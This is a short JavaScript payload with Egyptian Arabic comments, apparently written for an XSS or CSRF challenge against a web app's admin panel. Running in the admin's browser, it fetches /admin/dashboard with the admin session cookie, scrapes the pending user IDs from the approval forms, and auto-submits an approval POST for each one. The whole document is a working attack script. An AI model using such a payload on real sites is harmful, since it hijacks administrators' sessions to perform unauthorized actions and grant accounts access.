(function() {
      // جرب نجيب قايمة الـ pending users من /admin/dashboard
      fetch('/admin/dashboard', {
          method: 'GET',
          credentials: 'include' // عشان يبعت الـ session cookie بتاع الـ admin
      })
      .then(response => response.text())
      .then(data => {
          // استخرج userIds من الـ HTML (نفترض إنها بتظهر في adminDashboard.ejs)
          // adminDashboard.ejs بيعرض pendingUsers كـ list
          var parser = new DOMParser();
          var doc = parser.parseFromString(data, 'text/html');
          var userIds = [];
          var forms = doc.querySelectorAll('form[action^="/admin/approve/"]');
          forms.forEach(form => {
              var action = form.getAttribute('action');
              var userId = action.split('/admin/approve/')[1];
              if (userId) userIds.push(userId);
          });

          // ابعت POST request لكل userId
          userIds.forEach(userId => {
              var form = document.createElement('form');
              form.method = 'POST';
              form.action = '/admin/approve/' + userId;
              document.body.appendChild(form);
              form.submit();
          });
      })
      .catch(error => console.error('Error:', error));
  })();
